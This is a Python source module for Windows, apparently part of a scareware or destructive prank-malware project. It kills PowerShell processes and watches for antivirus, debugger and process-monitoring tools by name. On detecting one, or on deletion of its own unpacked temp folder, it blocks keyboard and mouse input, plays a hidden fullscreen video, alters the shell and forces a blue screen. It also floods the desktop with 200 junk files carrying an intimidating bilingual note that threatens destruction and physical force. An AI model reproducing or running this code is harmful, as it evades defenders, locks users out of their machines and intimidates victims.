import ctypes
import os
import random
import threading
import tempfile
import subprocess
import sys
import win32gui
import time
import win32api
import psutil
import win32con
import miniaudio
from regedit_and_virus_safe import BSOD, change_shell_aftervideo
from start_gdi import stop_event

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        base_path = os.path.join(sys._MEIPASS, "resources")
    else:
        base_path = os.path.join(os.path.abspath("."), "resources")
    return os.path.join(base_path, relative_path)

###
file_path = r"C:\Windows\INF\iaLPSS2i_mausbhost_CNL.inf"
music_stop_event = threading.Event()
active_music_threads = []
###

def set_wallpaper(image_path):
    abs_path = os.path.abspath(image_path)
    def wallpaper_threading():
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)
            print("[OK] Обои установлены")
        except Exception as e:
            print(f"[EROR] {e}")
    threading.Thread(target=wallpaper_threading, daemon=True).start()

def remove_file_attributes(file_path):
    # Удаление атрибутов скрытого и системного
    os.system(f'attrib -s -h "{file_path}"')

def set_file_attributes(file_path):
    # Устанавливаем атрибуты скрытый и системный
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)


def change_txt_1():
    try:
        remove_file_attributes(file_path)
        with open(file_path, "w") as f:
            f.write("1")
            set_file_attributes(file_path)
            print("[END] Цифра файла txt была изменена на 1 успешно")
    except Exception as e:
        print(f"[ERROR] {e}")

def change_txt_2():
    try:
        remove_file_attributes(file_path)
        with open(file_path, "w") as f:
            f.write("2")
            set_file_attributes(file_path)
            print("[END] Цифра файла txt была изменена на 2 успешно")
    except Exception as e:
        print(f"[ERROR] {e}")

def change_txt_3():
    try:
        remove_file_attributes(file_path)
        with open(file_path, "w") as f:
            f.write("3")
            set_file_attributes(file_path)
            print("[END] Цифра файла txt была изменена на 3 успешно")
    except Exception as e:
        print(f"[ERROR] {e}")


def play_video_fullscreen(video_path):
    stop_event.set()
    
    player_exe_path = resource_path("Player.exe")

    if not os.path.exists(video_path):
        print(f"[ERROR] Видео файл не найден: {video_path}")
        BSOD()
        return

    if not os.path.exists(player_exe_path):
        print(f"[ERROR] Плеер Player.exe не найден: {player_exe_path}")
        BSOD()
        return

    try:
        ctypes.windll.user32.BlockInput(True)

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE

        process = subprocess.Popen(
            [player_exe_path, video_path],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

    except Exception as e:
        print(f"[ERROR] Ошибка при попытке инициализации Player.exe: {e}")
        ctypes.windll.user32.BlockInput(False)
        BSOD()
        return

    process.wait()
    
    ctypes.windll.user32.BlockInput(False)
    change_txt_3()
    change_shell_aftervideo()
    time.sleep(0.5)
    BSOD() 


def get_safe_path(long_name):
    buffer = ctypes.create_unicode_buffer(260)
    result = ctypes.windll.kernel32.GetShortPathNameW(long_name, buffer, 260)
    return buffer.value if result else long_name


def stop_any_music():
    global active_music_threads, music_stop_event
    if any(t.is_alive() for t in active_music_threads):
        music_stop_event.set()
        time.sleep(0.15) 
    music_stop_event.clear()


def _miniaudio_loop_worker(file_name):
    global music_stop_event
    
    try:
        full_path = os.path.abspath(resource_path(file_name))
        safe_path = get_safe_path(full_path)
    except NameError:
        full_path = os.path.abspath(file_name)
        safe_path = get_safe_path(full_path)

    if not os.path.isfile(safe_path):
        print(f"[Ошибка] Файл не найден: {file_name}")
        return

    try:
        def loop_stream_wrapper():
            required_frames = yield b""
            
            while not music_stop_event.is_set():
                original_stream = miniaudio.stream_file(safe_path)
                try:
                    while not music_stop_event.is_set():
                        try:
                            data = original_stream.send(required_frames)
                        except StopIteration:
                            break
                        required_frames = yield data
                finally:
                    original_stream.close()

        stream = loop_stream_wrapper()
        next(stream) 

        with miniaudio.PlaybackDevice() as device:
            device.start(stream)
            print(f"[OK] Музыка запущена (miniaudio): {file_name}")
            
            while device.running and not music_stop_event.is_set():
                time.sleep(0.1)
                
            device.stop()

    except Exception as e:
        print(f"[Ошибка воспроизведения {file_name}]: {e}")


def _start_music_thread(file_name):
    global active_music_threads
    
    stop_any_music()
    
    t = threading.Thread(target=_miniaudio_loop_worker, args=(file_name,), daemon=True)
    t.start()
    
    active_music_threads[:] = [th for th in active_music_threads if th.is_alive()]
    active_music_threads.append(t)


def playMusic_runappmain():
    _start_music_thread("runapp_main.MP3")


def playMusic_after50():
    _start_music_thread("after50.mp3")


def playmusic_for3():
    _start_music_thread("scaryfor3.MP3")


def monitor_process(video_path="Hacker2.mp4", check_interval=1):
    TARGET_KEYWORDS = [
        # Инструменты анализа процессов и мониторинга
        "systeminformer", "processhacker", "processexplorer", "procmon", "procexp", "autoruns", "ccleaner",
        "spyxx", "regshot", "wireshark", "fiddler", "charles", "tcpview", "netstat", "simpleunlocker", "unlocker", "powershell",
        
        # Установка Windows
        "rufus", "windowsinstallationassistant", "setupprep", "setuphost", "windows10upgraderapp",

        # Отладчики и декомпиляторы
        "ollydbg", "x64dbg", "x32dbg", "ida64", "idag", "ghidra", "dnspy", "ilspy", 
        "cheatengine", "scylla", "immunitydebugger", "windbg", "radare2", "reclass",
        
        # Антивирусное ПО и инструменты сканирования
        "kaspersky", "drweb", "avast", "malwarebytes", "mcafee", "norton", "bitdefender",
        "sophos", "eset", "nod32", "avg", "trendmicro", "comodo", "defenderui"
    ]


    [p.kill() for p in psutil.process_iter(['name']) if p.info['name'] == 'powershell.exe']
    
    if not hasattr(monitor_process, "_checked_paths"):
        monitor_process._checked_paths = {}

    def get_metadata_and_check(file_path):
        file_path = os.path.normpath(file_path.strip('"'))
        
        if file_path in monitor_process._checked_paths:
            return monitor_process._checked_paths[file_path]

        try:
            version_info = win32api.GetFileVersionInfo(file_path, "\\VarFileInfo\\Translation")
            if not version_info:
                return False
                
            lang, codepage = version_info[0]
            str_info = f"\\StringFileInfo\\{lang:04x}{codepage:04x}"
            
            fields = ['OriginalFilename', 'ProductName', 'FileDescription', 'InternalName']
            metadata_parts = []
            
            for field in fields:
                try:
                    val = win32api.GetFileVersionInfo(file_path, f"{str_info}\\{field}")
                    if val:
                        metadata_parts.append(str(val).lower())
                except Exception:
                    continue
            
            full_text = " ".join(metadata_parts)
            clean_text = "".join(ch for ch in full_text if ch.isalnum())
            
            for k in TARGET_KEYWORDS:
                if k in clean_text:
                    monitor_process._checked_paths[file_path] = True
                    return True
        except Exception:
            pass
            
        monitor_process._checked_paths[file_path] = False
        return False

    print(f"[*] Мониторинг процессов запущен. База триггеров: {len(TARGET_KEYWORDS)} слов.")
    triggered = False
    seen_pids = set()

    try:
        while True:
            for proc in psutil.process_iter(attrs=['pid', 'name', 'exe']):
                try:
                    pid = proc.info['pid']
                    name = proc.info['name']
                    path = proc.info['exe']

                    if not name or pid in seen_pids:
                        continue

                    clean_name = "".join(ch for ch in name.lower() if ch.isalnum())
                    is_match = any(k in clean_name for k in TARGET_KEYWORDS)

                    if not is_match and path and os.path.exists(path):
                        is_match = get_metadata_and_check(path)

                    if is_match:
                        seen_pids.add(pid)
                        if not triggered:
                            triggered = True
                            print(f"\n[ALERT] Обнаружен софт (PID: {pid}, Name: {name}). Видео будет запущено")
                            
                            play_video_fullscreen(resource_path(video_path))

                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                except Exception as e:
                    print(f"[-] Ошибка анализа процесса: {e}")
                    continue
        
            seen_pids = {p for p in seen_pids if psutil.pid_exists(p)}
            time.sleep(check_interval)

    except Exception as e:
        print(f"[ERROR] Ошибка цикла проверки процессов: {e}")

def monitor_mei_folders():
    def list_all_paths(folder):
        try:
            paths = set()
            for dirpath, dirnames, filenames in os.walk(folder):
                for name in dirnames + filenames:
                    paths.add(os.path.join(dirpath, name))
            return paths
        except Exception as e:
            print(f"[ERROR] Ошибка при сканировании папки {folder}: {e}")
            return set()

    def monitor_folder(folder_path):
        print(f"[MONITOR] Слежение за: {folder_path}")
        try:
            previous = list_all_paths(folder_path)
            while True:
                time.sleep(1)
                if not os.path.exists(folder_path):
                    print(f"[ALERT] Папка удалена: {folder_path}")
                    play_video_fullscreen(resource_path("Hacker2.mp4"))
                    break
                current = list_all_paths(folder_path)
                if previous - current:
                    print(f"[ALERT] Обнаружено удаление содержимого в: {folder_path}")
                    play_video_fullscreen(resource_path("Hacker2.mp4"))
                    break

                
                previous = current
        except Exception as e:
            print(f"[ERROR] Сбой мониторинга {folder_path}: {e}")

    def watcher():
        temp = tempfile.gettempdir()
        monitored = set()
        print(f"[INIT] Мониторинг TEMP: {temp}")
        while True:
            try:
                for name in os.listdir(temp):
                    if name.startswith("_MEI"):
                        path = os.path.join(temp, name)
                        if os.path.isdir(path) and path not in monitored:
                            print(f"[INFO] Обнаружена _MEI-папка: {path}")
                            t = threading.Thread(target=monitor_folder, args=(path,), daemon=True)
                            t.start()
                            monitored.add(path)
            except Exception as e:
                print(f"[ERROR] Ошибка при сканировании TEMP: {e}")
            time.sleep(1)

    try:
        thread = threading.Thread(target=watcher, daemon=True)
        thread.start()
        thread.join()
    except Exception as e:
        print(f"[FATAL] Ошибка запуска мониторинга: {e}")


text = """[EN]
The hacker group "Assault on the Armchair Troops" welcomes you. If you listened and watched the speech from our mentor carefully, then most likely you will not have any questions. If you did not consider it necessary to carefully read the instructions from our boss, then we can remind you of them, but first we want to say that we are watching you, and if we see something we do not like, your computer will be completely destroyed. But let's move on to the rules:
1. Do not try to remove our malware, this will not help anyway, since not only your computer is infected, but also your Internet traffic, therefore, you will only destroy the computer. Is this what you want?
2. Do not press the key combination ctrl + alt + del. No comments here. Some decided to ignore this rule, we had to send cars for them to resolve issues by force, if you know what we mean.
3. Open as few files as possible, because the more files you open, the greater the chance that we will take some measures against you.
You have a long, long, difficult path ahead, but, of course, bad consequences can be avoided by simply following these rules. And remember - we always see and notice everything.

[RU]

Хакерская группировка "Штурм кабинетных войск" приветствует вас. Если вы внимательно слушали и смотрели речь от нашего наставника, то скорее всего, вопросов у вас не возникнет. Если же вы не посчитали нужным внимательно ознакомиться с инструкциями от нашего босса, то мы может напомнить вам их, но прежде мы хотим сказать, что мы наблюдаем за вами, и если мы увидим то, что нам не нравится - вам компьютер будет полностью уничтожен. Но перейдем к правилам:
1. Не пытайтесь удалить наше вредоносное ПО, это все равно не поможет, так как заражен не только ваш компьютер, но и интернет-трафик тоже, следовательно, вы только уничтожите компьютер. Вы этого хотите?
2. Не нажимайте комбинацию клавиш ctrl + alt + del. Тут без комментариев. Некоторые решили проигнорировать это правило, пришлось отправлять за ними машины, для решения вопросов силой, если вы понимаете, про что мы.
3. Открывайте как можно меньше файлов, ведь чем больше файлов вы откроете, тем больше шанс того, что мы примем некоторые меры в отношении вас.
Вам предстоит долгий и долгий сложный путь, но, конечно, плохих последствий можно избежать, просто следуя этим правилам. И помните - мы всегда всё видим и замечаем."""


def create_random_files(num_files=200, desktop_path=None, max_threads=10):
    """Создает файлы с ограничением на число потоков"""
    if desktop_path is None:
        desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')

    def generate_random_filename(extension, length=8):
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choices(chars, k=length)) + extension

    def create_file(_):
        try:
            if random.choice([True, False]):
                extension = '.exe'
                file_path = os.path.join(desktop_path, generate_random_filename(extension))
                with open(file_path, 'wb') as f:
                    pass
                #print(f'Создан файл: {file_path}')
            else:
                extension = '.txt'
                file_path = os.path.join(desktop_path, generate_random_filename(extension))
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(text)
                #print(f'Создан файл: {file_path}')
        except Exception as e:
            print(f'Ошибка: {e}')

    active_threads = []
    for i in range(num_files):
        # Ждем, если потоков слишком много
        while threading.active_count() > max_threads:
            pass

        thread = threading.Thread(target=create_file, args=(i,), daemon=True)
        active_threads.append(thread)
        thread.start()

    # Ждем завершения всех потоков
    for thread in active_threads:
        thread.join()

    print("[END] Все файлы созданы!")
